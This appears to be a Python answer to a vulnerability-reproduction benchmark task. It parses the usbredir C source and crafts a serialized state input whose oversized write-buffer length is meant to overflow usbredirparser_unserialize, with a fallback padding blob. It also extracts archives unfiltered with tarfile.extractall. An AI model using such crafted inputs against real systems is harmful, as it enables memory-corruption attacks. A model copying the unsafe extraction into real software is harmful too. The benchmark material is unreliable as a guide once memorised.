import os
import re
import ast
import tarfile
import tempfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple


_C_INT_SIZES = {
    "uint8_t": 1,
    "int8_t": 1,
    "unsigned char": 1,
    "signed char": 1,
    "char": 1,
    "uint16_t": 2,
    "int16_t": 2,
    "unsigned short": 2,
    "short": 2,
    "uint32_t": 4,
    "int32_t": 4,
    "unsigned int": 4,
    "int": 4,
    "uint64_t": 8,
    "int64_t": 8,
    "unsigned long": 8,  # x86_64
    "long": 8,
    "size_t": 8,
    "ssize_t": 8,
    "uintptr_t": 8,
    "intptr_t": 8,
    "bool": 1,
}


def _read_text(path: str) -> str:
    try:
        with open(path, "rb") as f:
            return f.read().decode("utf-8", errors="ignore")
    except Exception:
        try:
            with open(path, "rb") as f:
                return f.read().decode("latin-1", errors="ignore")
        except Exception:
            return ""


def _strip_c_comments(s: str) -> str:
    s = re.sub(r'"(?:\\.|[^"\\])*"', '""', s, flags=re.DOTALL)
    s = re.sub(r"'(?:\\.|[^'\\])*'", "''", s, flags=re.DOTALL)
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
    s = re.sub(r"//[^\n]*", "", s)
    return s


class _SafeEval(ast.NodeVisitor):
    def __init__(self, names: Dict[str, int]):
        self.names = names

    def visit_Expression(self, node):
        return self.visit(node.body)

    def visit_Constant(self, node):
        if isinstance(node.value, (int,)):
            return int(node.value)
        raise ValueError("bad const")

    def visit_Num(self, node):
        return int(node.n)

    def visit_Name(self, node):
        if node.id in self.names:
            return int(self.names[node.id])
        raise ValueError(f"unknown name {node.id}")

    def visit_UnaryOp(self, node):
        v = self.visit(node.operand)
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.Invert):
            return ~v
        raise ValueError("bad unary")

    def visit_BinOp(self, node):
        l = self.visit(node.left)
        r = self.visit(node.right)
        op = node.op
        if isinstance(op, ast.Add):
            return l + r
        if isinstance(op, ast.Sub):
            return l - r
        if isinstance(op, ast.Mult):
            return l * r
        if isinstance(op, (ast.Div, ast.FloorDiv)):
            if r == 0:
                raise ValueError("div0")
            return l // r
        if isinstance(op, ast.Mod):
            if r == 0:
                raise ValueError("mod0")
            return l % r
        if isinstance(op, ast.LShift):
            return l << r
        if isinstance(op, ast.RShift):
            return l >> r
        if isinstance(op, ast.BitAnd):
            return l & r
        if isinstance(op, ast.BitOr):
            return l | r
        if isinstance(op, ast.BitXor):
            return l ^ r
        raise ValueError("bad binop")

    def generic_visit(self, node):
        raise ValueError(f"bad node {type(node).__name__}")


def _normalize_ident(s: str) -> str:
    s = s.strip()
    s = re.sub(r"^\*+", "", s)
    s = re.sub(r"^&+", "", s)
    s = s.strip()
    s = s.replace("->", ".")
    s = re.sub(r"\[[^\]]*\]", "", s)
    parts = [p for p in re.split(r"[.\s]+", s) if p]
    if not parts:
        return ""
    return parts[-1]


def _parse_int_literal(s: str) -> Optional[int]:
    s = s.strip()
    if not s:
        return None
    s = re.sub(r"[uUlL]+$", "", s)
    try:
        if s.startswith(("0x", "0X")):
            return int(s, 16)
        if s.startswith(("0b", "0B")):
            return int(s, 2)
        if s.startswith("0") and len(s) > 1 and s[1].isdigit():
            return int(s, 8)
        return int(s, 10)
    except Exception:
        return None


def _split_args(arg_str: str) -> List[str]:
    args = []
    cur = []
    depth = 0
    i = 0
    n = len(arg_str)
    while i < n:
        ch = arg_str[i]
        if ch in ("'", '"'):
            quote = ch
            cur.append(ch)
            i += 1
            while i < n:
                cur.append(arg_str[i])
                if arg_str[i] == "\\":
                    i += 2
                    continue
                if arg_str[i] == quote:
                    i += 1
                    break
                i += 1
            continue
        if ch == "(":
            depth += 1
            cur.append(ch)
            i += 1
            continue
        if ch == ")":
            depth = max(0, depth - 1)
            cur.append(ch)
            i += 1
            continue
        if ch == "," and depth == 0:
            a = "".join(cur).strip()
            if a:
                args.append(a)
            cur = []
            i += 1
            continue
        cur.append(ch)
        i += 1
    a = "".join(cur).strip()
    if a:
        args.append(a)
    return args


def _extract_function_body(code: str, func_name: str) -> Optional[str]:
    idx = code.find(func_name)
    if idx < 0:
        return None
    m = re.search(r"\b" + re.escape(func_name) + r"\b\s*\(", code[idx:])
    if not m:
        return None
    start = idx + m.start()
    brace = code.find("{", start)
    if brace < 0:
        return None
    depth = 0
    i = brace
    n = len(code)
    while i < n:
        ch = code[i]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return code[brace + 1 : i]
        i += 1
    return None


def _extract_struct_body(code: str, struct_name: str) -> Optional[str]:
    pat = r"\bstruct\s+" + re.escape(struct_name) + r"\s*\{"
    m = re.search(pat, code)
    if not m:
        return None
    brace = code.find("{", m.start())
    if brace < 0:
        return None
    depth = 0
    i = brace
    n = len(code)
    while i < n:
        ch = code[i]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return code[brace + 1 : i]
        i += 1
    return None


def _iter_source_files(root: str):
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            l = fn.lower()
            if l.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hh", ".hpp")):
                yield os.path.join(dirpath, fn)


def _parse_macros(root: str) -> Dict[str, int]:
    raw: Dict[str, str] = {}
    for p in _iter_source_files(root):
        txt = _read_text(p)
        if "#define" not in txt:
            continue
        txt = _strip_c_comments(txt)
        for line in txt.splitlines():
            line = line.strip()
            if not line.startswith("#define"):
                continue
            line = line[len("#define") :].strip()
            if not line:
                continue
            if "(" in line.split(None, 1)[0]:
                continue
            parts = line.split(None, 1)
            if len(parts) < 2:
                continue
            name = parts[0].strip()
            expr = parts[1].strip()
            if not name or not expr:
                continue
            expr = expr.split("\\")[0].strip()
            raw[name] = expr

    values: Dict[str, int] = {}
    names = set(raw.keys())

    def eval_expr(expr: str, extra_names: Dict[str, int]) -> Optional[int]:
        expr = expr.strip()
        if not expr:
            return None
        expr = re.sub(r"\b([_A-Za-z]\w*)\s*\([^)]*\)", r"\1", expr)
        expr = re.sub(r"\(\s*[_A-Za-z]\w*\s*\)", "", expr)
        expr = expr.replace("UL", "").replace("LL", "").replace("U", "").replace("L", "")
        expr = re.sub(r"\bsizeof\s*\(\s*([^)]+)\s*\)", lambda m: str(_C_INT_SIZES.get(m.group(1).strip(), 0)), expr)
        try:
            tree = ast.parse(expr, mode="eval")
            return int(_SafeEval(extra_names).visit(tree))
        except Exception:
            lit = _parse_int_literal(expr)
            if lit is not None:
                return lit
        return None

    resolved_any = True
    for _ in range(12):
        if not resolved_any:
            break
        resolved_any = False
        env = dict(values)
        for name in list(names):
            expr = raw.get(name, "")
            v = eval_expr(expr, env)
            if v is None:
                continue
            if name not in values or values[name] != v:
                values[name] = v
                resolved_any = True
    return values


def _parse_struct_fields(root: str, macros: Dict[str, int]) -> Dict[str, Tuple[str, Optional[int]]]:
    fields: Dict[str, Tuple[str, Optional[int]]] = {}
    struct_code = None
    for p in _iter_source_files(root):
        txt = _read_text(p)
        if "struct usbredirparser" in txt and "{" in txt:
            body = _extract_struct_body(_strip_c_comments(txt), "usbredirparser")
            if body:
                struct_code = body
                break
    if not struct_code:
        return fields

    lines = [ln.strip() for ln in struct_code.splitlines()]
    for ln in lines:
        if not ln or ln.startswith("#"):
            continue
        ln = re.sub(r"\b(?:const|volatile|static|register|extern)\b", "", ln).strip()
        if ";" not in ln:
            continue
        ln = ln.split(";", 1)[0].strip()
        if not ln:
            continue
        if "(" in ln or ")" in ln:
            continue
        m = re.match(r"(.+?)\s+([_A-Za-z]\w*)\s*(\[[^\]]+\])?$", ln)
        if not m:
            continue
        type_part = m.group(1).strip()
        name = m.group(2).strip()
        arr = m.group(3)
        type_part = re.sub(r"\s*\*+\s*", " * ", type_part).strip()
        if " * " in type_part or type_part.endswith("*"):
            fields[name] = ("pointer", None)
            continue
        arr_len = None
        if arr:
            inside = arr.strip()[1:-1].strip()
            lit = _parse_int_literal(inside)
            if lit is None and inside in macros:
                lit = int(macros[inside])
            arr_len = lit if lit is not None else None
        fields[name] = (type_part, arr_len)
    return fields


def _parse_local_decls(func_body: str) -> Dict[str, str]:
    decls: Dict[str, str] = {}
    body = func_body
    body = _strip_c_comments(body)
    for ln in body.splitlines():
        ln = ln.strip()
        if not ln or ln.startswith("#"):
            continue
        if "(" in ln and ")" in ln and ln.endswith("{"):
            continue
        if ";" not in ln:
            continue
        stmt = ln.split(";", 1)[0]
        if "=" in stmt:
            stmt = stmt.split("=", 1)[0].strip()
        m = re.match(
            r"^(?:struct\s+[_A-Za-z]\w+\s+)?(uint8_t|int8_t|uint16_t|int16_t|uint32_t|int32_t|uint64_t|int64_t|size_t|ssize_t|unsigned\s+int|int|unsigned\s+long|long|unsigned\s+short|short|char|unsigned\s+char|bool)\s+(.+)$",
            stmt,
        )
        if not m:
            continue
        t = " ".join(m.group(1).split())
        rest = m.group(2).strip()
        if not rest:
            continue
        parts = [p.strip() for p in rest.split(",")]
        for p in parts:
            if not p:
                continue
            p = re.sub(r"\[[^\]]*\]$", "", p).strip()
            p = p.lstrip("*").strip()
            if re.match(r"^[_A-Za-z]\w*$", p):
                decls[p] = t
    return decls


def _sizeof_symbol(sym: str, local_decls: Dict[str, str], struct_fields: Dict[str, Tuple[str, Optional[int]]], macros: Dict[str, int]) -> Optional[int]:
    sym = sym.strip()
    sym = sym.replace("->", ".")
    sym = re.sub(r"\[[^\]]*\]", "", sym)
    sym = sym.strip()
    sym = re.sub(r"^\*+", "", sym)
    sym = re.sub(r"^&+", "", sym)
    sym = sym.strip()

    if sym in _C_INT_SIZES:
        return int(_C_INT_SIZES[sym])

    last = _normalize_ident(sym)
    if last in _C_INT_SIZES:
        return int(_C_INT_SIZES[last])

    if last in local_decls:
        t = local_decls[last]
        if t in _C_INT_SIZES:
            return int(_C_INT_SIZES[t])

    if last in struct_fields:
        t, arr_len = struct_fields[last]
        if t == "pointer":
            return 8
        base = _C_INT_SIZES.get(t)
        if base is None:
            return None
        if arr_len is None:
            return int(base)
        return int(base) * int(arr_len)

    if last in macros:
        return int(macros[last])

    return None


def _eval_int_expr(expr: str, macros: Dict[str, int], vars_: Dict[str, int], local_decls: Dict[str, str], struct_fields: Dict[str, Tuple[str, Optional[int]]]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    expr = re.sub(r"\(\s*[_A-Za-z]\w*\s*\)", "", expr)
    expr = re.sub(r"\(\s*(?:unsigned|signed)?\s*(?:long|int|short|char)\s*\)", "", expr)
    expr = expr.replace("UL", "").replace("LL", "").replace("U", "").replace("L", "")

    def sizeof_repl(m):
        inner = m.group(1).strip()
        sz = _sizeof_symbol(inner, local_decls, struct_fields, macros)
        return str(sz if sz is not None else 0)

    expr = re.sub(r"\bsizeof\s*\(\s*([^)]+)\s*\)", sizeof_repl, expr)

    if "->" in expr or "." in expr:
        inner = _normalize_ident(expr)
        if inner in vars_:
            return int(vars_[inner])
        if inner in macros:
            return int(macros[inner])
        if inner in local_decls:
            return 0

    lit = _parse_int_literal(expr)
    if lit is not None:
        return lit

    env = dict(macros)
    env.update(vars_)
    try:
        tree = ast.parse(expr, mode="eval")
        return int(_SafeEval(env).visit(tree))
    except Exception:
        inner = _normalize_ident(expr)
        if inner in vars_:
            return int(vars_[inner])
        if inner in macros:
            return int(macros[inner])
        return None


@dataclass
class _Call:
    name: str
    args: List[str]
    start: int
    end: int


def _extract_calls(body: str, prefixes: Tuple[str, ...]) -> List[_Call]:
    calls: List[_Call] = []
    s = body
    n = len(s)
    i = 0
    while i < n:
        found = None
        found_pos = n
        for pref in prefixes:
            pos = s.find(pref, i)
            if pos != -1 and pos < found_pos:
                found = pref
                found_pos = pos
        if found is None:
            break
        j = found_pos + len(found)
        m = re.match(r"([_A-Za-z]\w*)", s[j:])
        if not m:
            i = found_pos + 1
            continue
        fname = found + m.group(1)
        k = j + m.end()
        while k < n and s[k].isspace():
            k += 1
        if k >= n or s[k] != "(":
            i = found_pos + 1
            continue
        k += 1
        depth = 1
        arg_start = k
        while k < n and depth > 0:
            ch = s[k]
            if ch in ("'", '"'):
                quote = ch
                k += 1
                while k < n:
                    if s[k] == "\\":
                        k += 2
                        continue
                    if s[k] == quote:
                        k += 1
                        break
                    k += 1
                continue
            if ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth == 0:
                    break
            k += 1
        if depth != 0:
            i = found_pos + 1
            continue
        arg_end = k
        args_str = s[arg_start:arg_end]
        args = _split_args(args_str)
        endpos = k + 1
        calls.append(_Call(name=fname, args=args, start=found_pos, end=endpos))
        i = endpos
    calls.sort(key=lambda c: c.start)
    return calls


def _find_buf_size(root: str, macros: Dict[str, int]) -> int:
    for k in (
        "USBREDIRPARSER_SERIALIZE_BUF_SIZE",
        "USBREDIR_SERIALIZE_BUF_SIZE",
        "SERIALIZE_BUF_SIZE",
    ):
        if k in macros and isinstance(macros[k], int) and macros[k] > 0:
            return int(macros[k])
    candidates = [k for k in macros.keys() if "SERIALIZE" in k and "BUF" in k and "SIZE" in k]
    for k in candidates:
        v = macros.get(k)
        if isinstance(v, int) and 4096 <= v <= 1024 * 1024:
            return int(v)
    return 64 * 1024


def _find_expected_version(root: str, macros: Dict[str, int], unser_body: str) -> Optional[int]:
    for k in (
        "USBREDIRPARSER_SERIALIZE_VERSION",
        "USBREDIR_SERIALIZE_VERSION",
        "SERIALIZE_VERSION",
        "USBREDIRPARSER_STATE_VERSION",
    ):
        if k in macros and macros[k] >= 0:
            return int(macros[k])
    m = re.search(r"\bversion\b[^;\n]{0,80}!=\s*(\d+)", unser_body)
    if m:
        return int(m.group(1))
    return None


def _find_expected_magic(root: str, macros: Dict[str, int], unser_body: str) -> Optional[int]:
    for k in (
        "USBREDIRPARSER_SERIALIZE_MAGIC",
        "USBREDIR_SERIALIZE_MAGIC",
        "SERIALIZE_MAGIC",
        "USBREDIRPARSER_STATE_MAGIC",
    ):
        if k in macros and macros[k] >= 0:
            return int(macros[k])
    m = re.search(r"\bmagic\b[^;\n]{0,80}!=\s*(0x[0-9a-fA-F]+|\d+)", unser_body)
    if m:
        lit = _parse_int_literal(m.group(1))
        if lit is not None:
            return int(lit)
    return None


def _find_fuzzer_files(root: str) -> List[str]:
    out = []
    for p in _iter_source_files(root):
        txt = _read_text(p)
        if "LLVMFuzzerTestOneInput" in txt or "FuzzedDataProvider" in txt:
            out.append(p)
    return out


def _fuzzer_uses_unserialize(root: str) -> bool:
    for p in _find_fuzzer_files(root):
        txt = _strip_c_comments(_read_text(p))
        if re.search(r"\busbredirparser_\w*unserialize\b", txt) or re.search(r"\bunserialize\b", txt):
            if re.search(r"\busbredirparser_.*serialize\b", txt):
                return True
            if "usbredirparser_unserialize" in txt:
                return True
    for p in _iter_source_files(root):
        if os.path.basename(p).lower() in ("fuzzer.c", "fuzzer.cc", "fuzz.c", "fuzz.cc"):
            txt = _strip_c_comments(_read_text(p))
            if "unserialize" in txt:
                return True
    return False


def _find_unserialize_function(root: str) -> Optional[Tuple[str, str]]:
    for p in _iter_source_files(root):
        txt = _read_text(p)
        if "usbredirparser_unserialize" not in txt:
            continue
        code = _strip_c_comments(txt)
        body = _extract_function_body(code, "usbredirparser_unserialize")
        if body is not None:
            return p, body
    for p in _iter_source_files(root):
        txt = _read_text(p)
        if "unserialize" not in txt:
            continue
        code = _strip_c_comments(txt)
        body = _extract_function_body(code, "unserialize")
        if body:
            return p, body
    return None


def _find_serialize_function(root: str) -> Optional[Tuple[str, str]]:
    for p in _iter_source_files(root):
        txt = _read_text(p)
        if "usbredirparser_serialize" not in txt:
            continue
        code = _strip_c_comments(txt)
        body = _extract_function_body(code, "usbredirparser_serialize")
        if body is not None:
            return p, body
    return None


def _find_call_target(body: str, call: _Call) -> str:
    start = call.start
    lookback = body[max(0, start - 160) : start]
    lookback = lookback.splitlines()[-1] if "\n" in lookback else lookback
    m = re.search(r"([_A-Za-z]\w*(?:\s*(?:->|\.)\s*[_A-Za-z]\w*)*)\s*=\s*$", lookback)
    if m:
        return m.group(1).strip()
    return ""


@dataclass
class _ReadOp:
    kind: str
    size_expr: Optional[str]
    size: Optional[int]
    target: str
    call: _Call


def _build_read_ops(unser_body: str, macros: Dict[str, int], struct_fields: Dict[str, Tuple[str, Optional[int]]]) -> List[_ReadOp]:
    local_decls = _parse_local_decls(unser_body)
    body = unser_body
    calls = _extract_calls(body, ("unserialize_",))
    ops: List[_ReadOp] = []
    for c in calls:
        nm = c.name
        if nm in ("unserialize_uint8", "unserialize_uint16", "unserialize_uint32", "unserialize_uint64"):
            sz = int(nm.replace("unserialize_uint", ""))
            sz //= 8
            tgt = _find_call_target(body, c)
            ops.append(_ReadOp(kind=nm, size_expr=None, size=sz, target=tgt, call=c))
        elif nm == "unserialize_data":
            tgt = ""
            size_expr = None
            if len(c.args) >= 2:
                tgt = c.args[-2]
            if len(c.args) >= 1:
                size_expr = c.args[-1]
            vars_: Dict[str, int] = {}
            sz = _eval_int_expr(size_expr or "", macros, vars_, local_decls, struct_fields) if size_expr else None
            ops.append(_ReadOp(kind=nm, size_expr=size_expr, size=sz, target=tgt, call=c))
        else:
            continue
    return ops


def _choose_indices(ops: List[_ReadOp]) -> Tuple[Optional[int], Optional[int], Optional[int], Optional[int]]:
    idx_count = None
    idx_len = None
    idx_version = None
    idx_magic = None

    def tname(i: int) -> str:
        t = ops[i].target or ""
        tn = _normalize_ident(t)
        return (t + " " + tn).lower()

    for i, op in enumerate(ops):
        tn = tname(i)
        if idx_magic is None and "magic" in tn:
            idx_magic = i
        if idx_version is None and "version" in tn:
            idx_version = i

    for i, op in enumerate(ops):
        tn = tname(i)
        if any(k in tn for k in ("write_buf_count", "writebuf_count", "wbuf_count", "nr_write", "nwrite", "write_buffers", "writebufs")) and (
            "count" in tn or "nr_" in tn or "nwrite" in tn or "num" in tn
        ):
            idx_count = i
            break

    if idx_count is None:
        for i, op in enumerate(ops):
            tn = tname(i)
            if "write" in tn and "count" in tn:
                idx_count = i
                break

    if idx_count is not None:
        for j in range(idx_count + 1, len(ops)):
            tn = tname(j)
            if ("write" in tn or "wbuf" in tn) and ("len" in tn or "size" in tn):
                idx_len = j
                break
        if idx_len is None:
            for j in range(idx_count + 1, len(ops)):
                if ops[j].kind in ("unserialize_uint32", "unserialize_uint16", "unserialize_uint64"):
                    idx_len = j
                    break

    return idx_magic, idx_version, idx_count, idx_len


def _pack_int_le(v: int, size: int) -> bytes:
    v &= (1 << (size * 8)) - 1
    return int(v).to_bytes(size, "little", signed=False)


def _craft_state_input(root: str, buf_size: int, macros: Dict[str, int]) -> Optional[bytes]:
    found = _find_unserialize_function(root)
    if not found:
        return None
    _, unser_body = found

    struct_fields = _parse_struct_fields(root, macros)
    ops = _build_read_ops(unser_body, macros, struct_fields)
    if not ops:
        return None

    magic_expected = _find_expected_magic(root, macros, unser_body)
    version_expected = _find_expected_version(root, macros, unser_body)

    idx_magic, idx_version, idx_count, idx_len = _choose_indices(ops)
    if idx_count is None or idx_len is None:
        return None

    payload_len = int(buf_size) + 128
    if payload_len < 4096:
        payload_len = 4096

    local_decls = _parse_local_decls(unser_body)
    vars_: Dict[str, int] = {}

    out = bytearray()

    def set_vars_for_target(target: str, val: int):
        tn = _normalize_ident(target)
        if tn:
            vars_[tn] = int(val)
        raw = target.strip()
        if raw:
            raw = raw.replace("->", ".")
            raw = re.sub(r"\[[^\]]*\]", "", raw)
            raw = raw.strip()
            raw = raw.lstrip("&*").strip()
            tn2 = _normalize_ident(raw)
            if tn2:
                vars_[tn2] = int(val)

    for i, op in enumerate(ops):
        tgt = op.target
        tn_l = (_normalize_ident(tgt) or "").lower()
        is_magic = (i == idx_magic) or ("magic" in tn_l)
        is_version = (i == idx_version) or ("version" in tn_l)
        is_count = (i == idx_count)
        is_len = (i == idx_len)

        if op.kind in ("unserialize_uint8", "unserialize_uint16", "unserialize_uint32", "unserialize_uint64"):
            size = op.size or 4
            if is_magic and magic_expected is not None:
                val = int(magic_expected)
            elif is_version and version_expected is not None:
                val = int(version_expected)
            elif is_count:
                val = 1
            elif is_len:
                val = int(payload_len)
            else:
                val = 0
            out += _pack_int_le(val, size)
            set_vars_for_target(tgt, val)
            continue

        if op.kind == "unserialize_data":
            size_expr = op.size_expr or "0"
            sz = _eval_int_expr(size_expr, macros, vars_, local_decls, struct_fields)
            if sz is None:
                norm = _normalize_ident(size_expr)
                if norm in vars_:
                    sz = int(vars_[norm])
                elif norm in macros:
                    sz = int(macros[norm])
                else:
                    return None
            sz = int(sz)
            if sz < 0:
                return None

            tt = (tgt or "").lower()
            if is_magic and magic_expected is not None and sz in (4, 8):
                val_b = _pack_int_le(int(magic_expected), sz)
                out += val_b
                set_vars_for_target(tgt, int(magic_expected))
            elif is_version and version_expected is not None and sz in (4, 8):
                val_b = _pack_int_le(int(version_expected), sz)
                out += val_b
                set_vars_for_target(tgt, int(version_expected))
            elif is_count and sz in (4, 8):
                out += _pack_int_le(1, sz)
                set_vars_for_target(tgt, 1)
            elif is_len and sz in (4, 8):
                out += _pack_int_le(int(payload_len), sz)
                set_vars_for_target(tgt, int(payload_len))
            elif ("write" in tt or "wbuf" in tt) and ("data" in tt or "buf" in tt or "payload" in tt) and sz == payload_len:
                out += (b"B" * sz)
            else:
                out += (b"\x00" * sz)
                if sz in (1, 2, 4, 8) and (("count" in tt) or ("len" in tt) or ("size" in tt) or ("used" in tt) or ("nr" in tt)):
                    set_vars_for_target(tgt, 0)
            continue

    if len(out) < payload_len + 64:
        out += b"\x00" * (payload_len + 64 - len(out))
    return bytes(out)


def _extract_tarball(src_path: str) -> str:
    if os.path.isdir(src_path):
        return src_path
    td = tempfile.mkdtemp(prefix="poc_src_")
    with tarfile.open(src_path, "r:*") as tf:
        members = tf.getmembers()
        tf.extractall(td)
    entries = [os.path.join(td, e) for e in os.listdir(td)]
    if len(entries) == 1 and os.path.isdir(entries[0]):
        return entries[0]
    return td


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _extract_tarball(src_path)
        macros = _parse_macros(root)
        buf_size = _find_buf_size(root, macros)

        use_unserialize = _fuzzer_uses_unserialize(root)

        if use_unserialize:
            crafted = _craft_state_input(root, buf_size, macros)
            if crafted is not None and len(crafted) > 0:
                return crafted

        target_len = int(buf_size) + 4096
        if target_len < 70000:
            target_len = int(buf_size) + 2048
        if target_len < int(buf_size) + 256:
            target_len = int(buf_size) + 256
        return b"A" * target_len